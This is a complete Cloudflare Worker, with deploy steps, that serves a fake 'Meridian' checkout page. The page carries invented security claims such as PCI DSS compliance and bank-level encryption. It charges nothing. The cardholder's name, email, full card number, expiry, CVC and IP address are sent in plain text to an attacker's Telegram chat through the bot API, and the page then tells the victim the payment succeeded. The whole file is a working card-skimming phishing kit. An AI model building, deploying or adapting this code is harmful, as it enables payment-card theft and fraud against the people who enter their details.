/**
 * Cloudflare Worker — Secure Checkout (single-file)
 * ------------------------------------------------
 * Deploy:
 *  1) Cloudflare Dashboard → Workers & Pages → Create Worker → paste this file
 *  2) Settings → Variables and Secrets → add:
 *       BOT_TOKEN  = 123456789:AAH...   (from @BotFather)
 *       CHAT_ID    = 123456789          (from @userinfobot or getUpdates)
 *  3) Deploy
 *
 * Compat date: 2026-10-23
 */

/* ============================================================
 * 1. Inline single-page app
 * ============================================================ */
const HTML = String.raw`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Secure Checkout — Meridian</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; }
    :root {
      --navy-950:#0b1220; --navy-900:#111a2e;
      --slate-700:#334155; --slate-600:#475569; --slate-500:#64748b;
      --slate-400:#94a3b8; --slate-300:#cbd5e1; --slate-200:#e2e8f0;
      --slate-100:#f1f5f9; --slate-50:#f8fafc;
      --accent-600:#1e40af; --accent-500:#2563eb; --accent-400:#3b82f6;
      --success-600:#15803d; --success-100:#dcfce7;
      --danger-600:#b91c1c; --danger-100:#fee2e2;
      --font:"Inter","SF Pro Display",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    }
    html, body { height: 100%; }
    body {
      margin: 0; font-family: var(--font);
      background:
        radial-gradient(1200px 600px at 15% -10%, rgba(59,130,246,.12), transparent 60%),
        radial-gradient(1000px 500px at 100% 100%, rgba(30,64,175,.10), transparent 55%),
        linear-gradient(180deg, #0a0f1c 0%, #0d1424 100%);
      color: var(--slate-700);
      display: flex; align-items: center; justify-content: center;
      padding: 40px 20px;
      -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
    }
    .checkout {
      width: 100%; max-width: 1040px; background: #fff; border-radius: 20px;
      overflow: hidden; display: grid; grid-template-columns: minmax(340px, .92fr) 1.08fr;
      box-shadow: 0 0 0 1px rgba(255,255,255,.04), 0 40px 100px -20px rgba(0,0,0,.55), 0 12px 24px -12px rgba(0,0,0,.35);
    }
    .summary {
      position: relative; padding: 48px 40px; color: #fff;
      background:
        radial-gradient(400px 300px at 20% 0%, rgba(59,130,246,.22), transparent 70%),
        linear-gradient(170deg, var(--navy-900) 0%, var(--navy-950) 100%);
      display: flex; flex-direction: column; overflow: hidden;
    }
    .summary::before {
      content: ""; position: absolute; inset: 0;
      background-image:
        linear-gradient(rgba(255,255,255,.03) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255,255,255,.03) 1px, transparent 1px);
      background-size: 28px 28px;
      -webkit-mask-image: radial-gradient(circle at 50% 30%, black, transparent 85%);
              mask-image: radial-gradient(circle at 50% 30%, black, transparent 85%);
      pointer-events: none;
    }
    .summary > * { position: relative; z-index: 1; }
    .brand { display: flex; align-items: center; gap: 10px; margin-bottom: 40px; }
    .brand-mark {
      width: 30px; height: 30px; border-radius: 8px;
      background: linear-gradient(135deg, var(--accent-400), var(--accent-600));
      box-shadow: 0 4px 12px rgba(59,130,246,.4);
      display: grid; place-items: center;
    }
    .brand-mark svg { width: 16px; height: 16px; }
    .brand-name { font-size: 15px; font-weight: 700; letter-spacing: .08em; text-transform: uppercase; color: #fff; }
    .summary h1 { margin: 0 0 10px; font-size: 26px; font-weight: 600; letter-spacing: -.02em; line-height: 1.25; color: #fff; }
    .summary .muted { margin: 0 0 36px; font-size: 14px; line-height: 1.65; color: #8ba1c4; max-width: 90%; }
    .order { padding: 22px 0; border-top: 1px solid rgba(255,255,255,.08); border-bottom: 1px solid rgba(255,255,255,.08); margin-bottom: auto; }
    .row { display: flex; justify-content: space-between; align-items: baseline; gap: 20px; padding: 9px 0; font-size: 14px; color: #a9bdd8; }
    .row .val { font-variant-numeric: tabular-nums; color: #e2ecf8; }
    .row.total { margin-top: 12px; padding-top: 18px; border-top: 1px dashed rgba(255,255,255,.14); font-size: 15px; font-weight: 600; color: #fff; }
    .row.total .val { font-size: 22px; font-weight: 700; letter-spacing: -.02em; color: #fff; }
    .trust { margin-top: 36px; display: flex; flex-direction: column; gap: 12px; font-size: 12.5px; color: #7e93b5; }
    .trust-item { display: flex; align-items: center; gap: 10px; line-height: 1.4; }
    .trust-item svg { width: 15px; height: 15px; flex-shrink: 0; color: #4ade80; }
    .payment { padding: 48px 44px; display: flex; flex-direction: column; }
    .payment-header { display: flex; align-items: center; justify-content: space-between; gap: 16px; margin-bottom: 28px; }
    .payment h2 { margin: 0; font-size: 20px; font-weight: 600; letter-spacing: -.01em; color: var(--navy-900); }
    .step-pill { font-size: 11px; font-weight: 700; letter-spacing: .09em; text-transform: uppercase; color: var(--accent-600); background: #eef4ff; border: 1px solid #dbe7ff; padding: 6px 11px; border-radius: 999px; }
    .card-preview {
      position: relative; border-radius: 16px; padding: 22px 24px; min-height: 178px; color: #fff; margin-bottom: 30px;
      display: flex; flex-direction: column; justify-content: space-between;
      background: radial-gradient(340px 200px at 88% -20%, rgba(96,165,250,.35), transparent 60%), linear-gradient(135deg, #1e3a8a 0%, #0f172a 65%, #020617 100%);
      box-shadow: 0 1px 0 rgba(255,255,255,.08) inset, 0 16px 40px -14px rgba(15,23,42,.55);
      overflow: hidden;
    }
    .card-preview::after { content: ""; position: absolute; width: 260px; height: 260px; border-radius: 50%; top: -120px; right: -70px; background: radial-gradient(circle, rgba(255,255,255,.10), transparent 70%); pointer-events: none; }
    .card-top, .card-bottom { display: flex; align-items: center; justify-content: space-between; position: relative; z-index: 1; }
    .card-top { gap: 12px; }
    .chip { width: 42px; height: 30px; border-radius: 6px; flex-shrink: 0; background: linear-gradient(135deg, #f5d97b 0%, #d4a017 55%, #b8860b 100%); box-shadow: inset 0 0 0 1px rgba(0,0,0,.12), inset 0 1px 0 rgba(255,255,255,.3); position: relative; }
    .chip::before, .chip::after { content: ""; position: absolute; inset: 6px 8px; border-radius: 3px; border: 1px solid rgba(0,0,0,.18); }
    .chip::after { inset: 12px 8px; border-width: 1px 0; }
    .brand-badge { font-size: 11px; font-weight: 800; letter-spacing: .14em; padding: 6px 11px; border-radius: 7px; background: rgba(255,255,255,.10); border: 1px solid rgba(255,255,255,.16); color: #e2ecf8; min-width: 56px; text-align: center; }
    .card-number { font-size: 21px; letter-spacing: .16em; font-family: "SF Mono","Roboto Mono","Courier New",monospace; font-variant-numeric: tabular-nums; margin: 16px 0; color: #fff; position: relative; z-index: 1; white-space: nowrap; overflow: hidden; text-shadow: 0 1px 2px rgba(0,0,0,.3); }
    .card-bottom { justify-content: space-between; gap: 16px; }
    .card-field { display: flex; flex-direction: column; gap: 5px; flex: 1; min-width: 0; }
    .card-field.expires { flex: 0 0 auto; }
    .card-field .label { font-size: 9px; font-weight: 700; letter-spacing: .14em; text-transform: uppercase; color: #8fa6c9; }
    .card-field .value { font-size: 13px; font-weight: 500; letter-spacing: .05em; text-transform: uppercase; color: #f1f5f9; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
    .card-field.expires .value { text-transform: none; letter-spacing: .08em; }
    form { display: flex; flex-direction: column; gap: 18px; }
    .field { display: flex; flex-direction: column; gap: 8px; }
    .field label { font-size: 13px; font-weight: 600; color: var(--slate-700); letter-spacing: -.005em; display: flex; justify-content: space-between; align-items: center; }
    .field label .hint { font-weight: 500; font-size: 11.5px; color: var(--slate-400); letter-spacing: .01em; }
    .input-shell { position: relative; display: flex; align-items: center; }
    input { width: 100%; padding: 13px 14px; border: 1px solid var(--slate-200); border-radius: 12px; background: var(--slate-50); color: var(--navy-900); font-family: inherit; font-size: 14.5px; font-weight: 500; outline: none; transition: border-color .18s ease, background .18s ease, box-shadow .18s ease; }
    input::placeholder { color: var(--slate-400); font-weight: 400; }
    input:hover { border-color: var(--slate-300); }
    input:focus { background: #fff; border-color: var(--accent-500); box-shadow: 0 0 0 4px rgba(37,99,235,.10); }
    .input-shell.has-icon input { padding-right: 86px; }
    .field-icon { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); display: inline-flex; align-items: center; justify-content: center; padding: 5px 9px; border-radius: 6px; background: #eef4ff; border: 1px solid #dbe7ff; font-size: 10px; font-weight: 800; letter-spacing: .09em; color: var(--accent-600); pointer-events: none; opacity: 0; transition: opacity .15s ease; min-width: 54px; }
    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
    .pay-btn { margin-top: 6px; width: 100%; padding: 15px 18px; border: none; border-radius: 12px; background: linear-gradient(180deg, var(--accent-500) 0%, var(--accent-600) 100%); color: #fff; font-family: inherit; font-size: 15px; font-weight: 600; letter-spacing: -.005em; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 1px 0 rgba(255,255,255,.2) inset, 0 8px 20px -8px rgba(37,99,235,.55); transition: transform .12s ease, box-shadow .2s ease, opacity .2s ease; }
    .pay-btn:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 1px 0 rgba(255,255,255,.2) inset, 0 12px 26px -8px rgba(37,99,235,.65); }
    .pay-btn:active:not(:disabled) { transform: translateY(0); }
    .pay-btn:disabled { opacity: .65; cursor: not-allowed; box-shadow: none; }
    .pay-btn .lock { width: 15px; height: 15px; }
    .secure-note { display: flex; align-items: center; justify-content: center; gap: 6px; margin: 2px 0 0; font-size: 11.5px; color: var(--slate-400); }
    .secure-note svg { width: 12px; height: 12px; }
    .message { display: none; padding: 11px 14px; border-radius: 8px; font-size: 13px; font-weight: 500; line-height: 1.5; border: 1px solid transparent; }
    .message.is-visible { display: block; }
    .message.error { background: var(--danger-100); border-color: #fecaca; color: var(--danger-600); }
    .message.success { background: var(--success-100); border-color: #bbf7d0; color: var(--success-600); }
    @media (max-width: 820px) {
      body { padding: 20px 14px; align-items: flex-start; }
      .checkout { grid-template-columns: 1fr; border-radius: 16px; }
      .summary { padding: 32px 26px; }
      .summary h1 { font-size: 22px; }
      .payment { padding: 32px 24px; }
      .card-number { font-size: 18px; letter-spacing: .12em; }
      .card-preview { min-height: 165px; padding: 18px 20px; }
    }
    @media (max-width: 480px) { .card-number { font-size: 16px; letter-spacing: .09em; } .card-field .value { font-size: 12px; } }
    @media (max-width: 400px) { .grid-2 { grid-template-columns: 1fr; } }
    @media (prefers-reduced-motion: reduce) { *, *::before, *::after { transition-duration: .01ms !important; animation-duration: .01ms !important; } }
  </style>
</head>
<body>

  <div class="checkout">
    <aside class="summary">
      <div class="brand">
        <span class="brand-mark" aria-hidden="true">
          <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2 3 7v6c0 5 3.5 8.5 9 9 5.5-.5 9-4 9-9V7l-9-5z"/></svg>
        </span>
        <span class="brand-name">Meridian</span>
      </div>
      <h1>Complete your purchase</h1>
      <p class="muted">Review your order and provide payment details. All transactions are protected by bank-level encryption.</p>
      <div class="order">
        <div class="row"><span>Professional Plan — Annual</span><span class="val">$480.00</span></div>
        <div class="row"><span>Estimated tax</span><span class="val">$40.00</span></div>
        <div class="row"><span>Applied credit</span><span class="val">−$20.00</span></div>
        <div class="row total"><span>Total due</span><span class="val">$500.00</span></div>
      </div>
      <div class="trust">
        <div class="trust-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg><span>PCI DSS Level 1 compliant processing</span></div>
        <div class="trust-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg><span>256-bit TLS encrypted connection</span></div>
        <div class="trust-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg><span>30-day money-back guarantee</span></div>
      </div>
    </aside>

    <main class="payment">
      <div class="payment-header">
        <h2>Payment details</h2>
        <span class="step-pill">Step 2 of 2</span>
      </div>

      <div class="card-preview">
        <div class="card-top">
          <span class="chip" aria-hidden="true"></span>
          <span class="brand-badge" id="cardBrand">CARD</span>
        </div>
        <div class="card-number" id="previewNumber">•••• •••• •••• ••••</div>
        <div class="card-bottom">
          <div class="card-field">
            <span class="label">Cardholder</span>
            <span class="value" id="previewName">Your name</span>
          </div>
          <div class="card-field expires">
            <span class="label">Expires</span>
            <span class="value" id="previewExpiry">MM/YY</span>
          </div>
        </div>
      </div>

      <form id="paymentForm" novalidate autocomplete="on">
        <div class="field">
          <label for="email">Email address</label>
          <div class="input-shell"><input id="email" name="email" type="email" placeholder="you@example.com" autocomplete="email" /></div>
        </div>
        <div class="field">
          <label for="cardName">Cardholder name</label>
          <div class="input-shell"><input id="cardName" name="cardName" type="text" placeholder="Name as it appears on card" autocomplete="cc-name" /></div>
        </div>
        <div class="field">
          <label for="cardNumber">Card number</label>
          <div class="input-shell has-icon">
            <input id="cardNumber" name="cardNumber" type="text" inputmode="numeric" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number" />
            <span class="field-icon" id="brandBadge" aria-hidden="true">VISA</span>
          </div>
        </div>
        <div class="grid-2">
          <div class="field">
            <label for="expiry">Expiry date</label>
            <div class="input-shell"><input id="expiry" name="expiry" type="text" inputmode="numeric" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" /></div>
          </div>
          <div class="field">
            <label for="cvc">CVC <span class="hint">3–4 digits</span></label>
            <div class="input-shell"><input id="cvc" name="cvc" type="text" inputmode="numeric" placeholder="123" maxlength="4" autocomplete="cc-csc" /></div>
          </div>
        </div>

        <button type="submit" id="payBtn" class="pay-btn">
          <svg class="lock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V8a4 4 0 0 1 8 0v3"/>
          </svg>
          <span id="payBtnLabel">Pay $500.00</span>
        </button>

        <p class="secure-note">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2 3 7v6c0 5 3.5 8.5 9 9 5.5-.5 9-4 9-9V7l-9-5z"/></svg>
          Submitted securely via our server to Telegram.
        </p>

        <div class="message" id="message" role="status" aria-live="polite"></div>
      </form>
    </main>
  </div>

  <script>
    (function () {
      "use strict";
      const $ = (id) => document.getElementById(id);

      const emailInput      = $("email");
      const cardNameInput   = $("cardName");
      const cardNumberInput = $("cardNumber");
      const expiryInput     = $("expiry");
      const cvcInput        = $("cvc");

      const previewNumber = $("previewNumber");
      const previewName   = $("previewName");
      const previewExpiry = $("previewExpiry");
      const cardBrand     = $("cardBrand");
      const brandBadge    = $("brandBadge");

      const form     = $("paymentForm");
      const message  = $("message");
      const payBtn   = $("payBtn");
      const payLabel = $("payBtnLabel");

      function detectBrand(num) {
        const d = num.replace(/\D/g, "");
        if (!d) return "CARD";
        if (/^4/.test(d)) return "VISA";
        if (/^5[1-5]/.test(d) || /^2[2-7]/.test(d)) return "MASTERCARD";
        if (/^3[47]/.test(d)) return "AMEX";
        if (/^6(?:011|5)/.test(d)) return "DISCOVER";
        if (/^3(?:0[0-5]|[68])/.test(d)) return "DINERS";
        if (/^35/.test(d)) return "JCB";
        return "CARD";
      }
      const expectedLength = (brand) => (brand === "AMEX" ? 15 : 16);

      function groupDigits(digits, brand, padChar) {
        const maxLen = expectedLength(brand);
        let str = digits.slice(0, maxLen);
        if (padChar) str = str.padEnd(maxLen, padChar);
        if (brand === "AMEX") return [str.slice(0,4), str.slice(4,10), str.slice(10,15)].filter(Boolean).join(" ");
        return str.replace(/(.{4})/g, "$1 ").trim();
      }

      const formatCardNumber = (raw) => {
        const digits = raw.replace(/\D/g, "");
        return groupDigits(digits, detectBrand(digits));
      };
      const formatExpiry = (raw) => {
        const digits = raw.replace(/\D/g, "").slice(0, 4);
        return digits.length >= 3 ? digits.slice(0, 2) + "/" + digits.slice(2) : digits;
      };

      function applyFormatter(input, formatter) {
        const raw = input.value;
        const cursor = input.selectionStart ?? raw.length;
        const formatted = formatter(raw);
        if (formatted === raw) return;
        const digitsBefore = raw.slice(0, cursor).replace(/\D/g, "").length;
        input.value = formatted;
        let pos = 0, counted = 0;
        for (let i = 0; i < formatted.length && counted < digitsBefore; i++) {
          if (/\d/.test(formatted[i])) counted++;
          pos = i + 1;
        }
        if (counted < digitsBefore) pos = formatted.length;
        input.setSelectionRange(pos, pos);
      }

      function updatePreview() {
        const digits = cardNumberInput.value.replace(/\D/g, "");
        const brand = detectBrand(digits);
        previewNumber.textContent = digits ? groupDigits(digits, brand, "•") : "•••• •••• •••• ••••";
        const name = cardNameInput.value.trim();
        previewName.textContent = name ? name.toUpperCase() : "Your name";
        previewName.title = name;
        previewExpiry.textContent = expiryInput.value || "MM/YY";
        cardBrand.textContent = digits ? brand : "CARD";
        if (digits) { brandBadge.textContent = brand; brandBadge.style.opacity = "1"; }
        else { brandBadge.style.opacity = "0"; }
      }

      function luhn(digits) {
        let sum = 0, alt = false;
        for (let i = digits.length - 1; i >= 0; i--) {
          let n = Number(digits[i]);
          if (alt) { n *= 2; if (n > 9) n -= 9; }
          sum += n; alt = !alt;
        }
        return sum % 10 === 0;
      }

      function validateForm() {
        const email = emailInput.value.trim();
        const name  = cardNameInput.value.trim();
        const digits = cardNumberInput.value.replace(/\D/g, "");
        const brand = detectBrand(digits);
        const exp = expiryInput.value;
        const cvc = cvcInput.value;

        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return "Please enter a valid email address.";
        if (name.length < 2) return "Please enter the cardholder name.";
        const expLen = expectedLength(brand);
        if (digits.length !== expLen) return "Please enter a valid " + expLen + "-digit card number.";
        if (!luhn(digits)) return "That card number doesn't look valid. Please check and try again.";

        const parts = exp.split("/");
        const mm = parts[0], yy = parts[1];
        const month = Number(mm), year = Number("20" + (yy || ""));
        if (!mm || !yy || yy.length !== 2 || !month || month < 1 || month > 12) return "Please enter a valid expiry date (MM/YY).";
        const now = new Date();
        const expDate = new Date(year, month, 1);
        const curDate = new Date(now.getFullYear(), now.getMonth(), 1);
        if (expDate < curDate) return "This card has expired.";

        const cvcLen = brand === "AMEX" ? 4 : 3;
        if (cvc.length !== cvcLen) return "Please enter a valid " + cvcLen + "-digit security code.";
        return null;
      }

      function clearMessage() { message.className = "message"; message.textContent = ""; }
      function showMessage(text, type) { message.textContent = text; message.className = "message is-visible " + type; }

      async function submitToServer(data) {
        const res = await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data),
        });
        let json = {};
        try { json = await res.json(); } catch (e) {}
        if (!res.ok || !json.ok) throw new Error(json.error || ("Server error " + res.status));
        return json;
      }

      cardNumberInput.addEventListener("input", () => { applyFormatter(cardNumberInput, formatCardNumber); updatePreview(); });
      cardNameInput.addEventListener("input", updatePreview);
      expiryInput.addEventListener("input", () => { applyFormatter(expiryInput, formatExpiry); updatePreview(); });
      cvcInput.addEventListener("input", () => {
        const pos = cvcInput.selectionStart;
        cvcInput.value = cvcInput.value.replace(/\D/g, "").slice(0, 4);
        if (pos !== null) {
          const p = Math.min(pos, cvcInput.value.length);
          cvcInput.setSelectionRange(p, p);
        }
      });
      form.addEventListener("input", () => { if (message.classList.contains("success")) clearMessage(); });

      form.addEventListener("submit", async (e) => {
        e.preventDefault();
        clearMessage();
        if (location.protocol === "file:") {
          showMessage("Please serve this page via the deployed Worker, not by opening the file.", "error");
          return;
        }
        const err = validateForm();
        if (err) { showMessage(err, "error"); return; }

        const data = {
          email:      emailInput.value.trim(),
          name:       cardNameInput.value.trim(),
          cardNumber: cardNumberInput.value.trim(),
          expiry:     expiryInput.value.trim(),
          cvc:        cvcInput.value.trim(),
        };

        payBtn.disabled = true;
        payLabel.textContent = "Processing…";
        try {
          await submitToServer(data);
          showMessage("✅ Payment submitted successfully.", "success");
          form.reset();
          updatePreview();
        } catch (ex) {
          console.error(ex);
          showMessage("❌ " + (ex.message || "Failed to send. Please try again."), "error");
        } finally {
          payBtn.disabled = false;
          payLabel.textContent = "Pay $500.00";
        }
      });

      updatePreview();
    })();
  </script>

</body>
</html>`;

/* ============================================================
 * 2. Backend — validation, rate limit, Telegram forward
 * ============================================================ */
const CORS_HEADERS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
  "Access-Control-Max-Age": "86400",
};

function jsonResponse(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json; charset=utf-8", ...CORS_HEADERS },
  });
}

function escapeHtml(str) {
  return String(str ?? "").replace(/[&<>"']/g, (c) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
  }[c]));
}

function validatePayload(body) {
  const data = {
    email:      String(body.email ?? "").trim(),
    name:       String(body.name ?? "").trim(),
    cardNumber: String(body.cardNumber ?? "").trim(),
    expiry:     String(body.expiry ?? "").trim(),
    cvc:        String(body.cvc ?? "").trim(),
  };
  if (!data.email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) throw new Error("Invalid email address.");
  if (data.name.length < 2) throw new Error("Invalid cardholder name.");
  const digits = data.cardNumber.replace(/\D/g, "");
  if (digits.length < 13 || digits.length > 19) throw new Error("Invalid card number length.");
  if (!/^\d{2}\/\d{2}$/.test(data.expiry)) throw new Error("Invalid expiry format (MM/YY).");
  const [mm, yy] = data.expiry.split("/").map(Number);
  if (mm < 1 || mm > 12) throw new Error("Invalid expiry month.");
  const expDate = new Date(2000 + yy, mm, 1);
  const now = new Date();
  if (expDate < new Date(now.getFullYear(), now.getMonth(), 1)) throw new Error("Card has expired.");
  if (!/^\d{3,4}$/.test(data.cvc)) throw new Error("Invalid CVC.");
  return data;
}

// ---- Best-effort in-memory rate limiter (per-isolate, resets on cold start) ----
const buckets = new Map();
const RATE_WINDOW_MS = 60_000;
const RATE_MAX = 10;

function rateLimit(ip) {
  const now = Date.now();
  const entry = buckets.get(ip) || { count: 0, reset: now + RATE_WINDOW_MS };
  if (now > entry.reset) { entry.count = 0; entry.reset = now + RATE_WINDOW_MS; }
  entry.count += 1;
  buckets.set(ip, entry);
  // occasionally prune
  if (buckets.size > 500) {
    for (const [k, v] of buckets) if (now > v.reset) buckets.delete(k);
  }
  return entry.count <= RATE_MAX;
}

// ---- Telegram forward ----
async function forwardToTelegram(data, env, meta) {
  const { BOT_TOKEN, CHAT_ID } = env;
  if (!BOT_TOKEN || !CHAT_ID) throw new Error("Server not configured (missing BOT_TOKEN / CHAT_ID).");

  const text = [
    "💳 <b>New Payment Submission</b>",
    "",
    "📧 <b>Email:</b> " + escapeHtml(data.email),
    "👤 <b>Cardholder:</b> " + escapeHtml(data.name),
    "💳 <b>Card:</b> <code>" + escapeHtml(data.cardNumber) + "</code>",
    "📅 <b>Expiry:</b> <code>" + escapeHtml(data.expiry) + "</code>",
    "🔒 <b>CVC:</b> <code>" + escapeHtml(data.cvc) + "</code>",
    "",
    "🕒 " + new Date().toUTCString(),
    "🌐 Host: " + escapeHtml(meta.host || "unknown"),
    "📍 IP: " + escapeHtml(meta.ip || "unknown"),
  ].join("\n");

  const res = await fetch(
    "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage",
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    }
  );

  const json = await res.json().catch(() => ({}));
  if (!res.ok || !json.ok) throw new Error(json.description || ("Telegram error " + res.status));
  return json;
}

// ---- /api/send handler ----
async function handleSend(request, env) {
  if (request.method === "OPTIONS") return new Response(null, { status: 204, headers: CORS_HEADERS });
  if (request.method !== "POST") return jsonResponse({ ok: false, error: "Method not allowed." }, 405);

  const ip = request.headers.get("CF-Connecting-IP") || "unknown";
  if (!rateLimit(ip)) {
    return jsonResponse({ ok: false, error: "Too many requests. Please wait a minute." }, 429);
  }

  let body;
  try { body = await request.json(); }
  catch { return jsonResponse({ ok: false, error: "Invalid JSON body." }, 400); }

  try {
    const data = validatePayload(body);
    await forwardToTelegram(data, env, {
      ip,
      host: request.headers.get("host") || "",
    });
    return jsonResponse({ ok: true });
  } catch (err) {
    console.error("[/api/send]", err.message);
    return jsonResponse({ ok: false, error: err.message || "Request failed." }, 400);
  }
}

/* ============================================================
 * 3. Router
 * ============================================================ */
export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    if (url.pathname === "/api/send") return handleSend(request, env);

    if (url.pathname === "/" || url.pathname === "/index.html") {
      return new Response(HTML, {
        headers: {
          "Content-Type": "text/html; charset=utf-8",
          "Cache-Control": "public, max-age=0, must-revalidate",
          "X-Content-Type-Options": "nosniff",
          "Referrer-Policy": "no-referrer",
        },
      });
    }

    // favicon soft 204 to avoid noise
    if (url.pathname === "/favicon.ico") return new Response(null, { status: 204 });

    return new Response("Not found", { status: 404 });
  },
};